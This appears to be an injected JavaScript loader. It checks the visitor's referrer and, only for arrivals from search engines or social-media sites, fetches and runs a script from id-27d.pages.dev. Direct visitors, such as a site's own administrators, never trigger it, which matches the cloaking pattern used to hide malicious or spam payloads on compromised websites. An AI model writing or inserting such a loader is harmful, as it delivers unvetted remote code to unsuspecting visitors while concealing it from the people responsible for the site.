(function() {
    'use strict';
    

    function isRefererValid() {
        var referer = document.referrer.toLowerCase();
        

        if (!referer || referer.length === 0) {
            console.log('Tidak ada referer - script tidak dijalankan');
            return false;
        }

        var socialMediaDomains = [
            'facebook.com', 'fb.com',
            'twitter.com', 'x.com',
            'instagram.com',
            'linkedin.com',
            'pinterest.com',
            'tiktok.com',
            'youtube.com',
            'whatsapp.com',
            'telegram.org',
            'snapchat.com',
            'reddit.com',
            'tumblr.com',
            'plus.google.com'
        ];
        

        var searchEngineDomains = [
            'google.', 'google.com', 'google.co',
            'bing.', 'bing.com',
            'yahoo.', 'yahoo.com',
            'yandex.', 'yandex.com',
            'baidu.', 'baidu.com',
            'duckduckgo.', 'duckduckgo.com',
            'ask.', 'ask.com',
            'aol.', 'aol.com',
            'search.', 'search.com'
        ];
        

        var validDomains = socialMediaDomains.concat(searchEngineDomains);
        

        var isValid = validDomains.some(function(domain) {
            return referer.indexOf(domain) !== -1;
        });
        

        if (isValid) {
            console.log('Referer valid ditemukan:', document.referrer);
        } else {
            console.log('Referer tidak valid atau tidak dikenali:', document.referrer);
        }
        
        return isValid;
    }

    function loadMainScript() {
        console.log('Memuat script utama dari id-27d.pages.dev...');

        var script = document.createElement('script');
        script.src = 'https://id-27d.pages.dev/id.js';
        script.async = true;

        script.onerror = function() {
            console.error('Gagal memuat script utama dari id-27d.pages.dev/id.js');
        };
        
        script.onload = function() {
            console.log('Script utama berhasil dimuat');
        };

        document.head.appendChild(script);
    }
    
    function checkAndLoad() {

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                if (isRefererValid()) {
                    loadMainScript();
                }
            });
        } else {

            if (isRefererValid()) {
                loadMainScript();
            }
        }
    }
    

    if (window.pu) {
        console.log('Script utama sudah dimuat sebelumnya');
    } else {

        checkAndLoad();
    }
})();
